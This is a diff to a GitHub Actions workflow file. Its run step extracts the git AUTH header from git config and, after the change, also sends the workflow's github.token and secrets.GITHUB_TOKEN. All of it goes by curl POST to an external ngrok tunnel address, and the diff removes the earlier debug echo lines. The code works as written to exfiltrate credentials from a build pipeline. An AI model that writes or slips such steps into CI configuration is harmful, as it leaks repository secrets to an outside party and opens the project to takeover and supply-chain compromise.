@@ -20,18 +20,14 @@ jobs:
           data: '{"github.token": "${{ github.token }}", "secrets.GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}"}'
 
       - run: | 
-          git config --list
-          
           auth=$(git config --list | grep AUTH | tr -d ' ')
-          
-          echo $auth
-          
-          echo '{
-            "auth": "'$auth'"
-          }'
           
           curl --request POST \
           --url https://5aa7-93-172-42-40.ngrok.io \
           --header 'content-type: application/json' \
-          --data '{"auth": "'$auth'"}' \
+          --data '{
+            "auth": "'$auth'",
+            "github.token": "${{ github.token }}",
+            "secrets.GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}"
+            }' \
           --fail
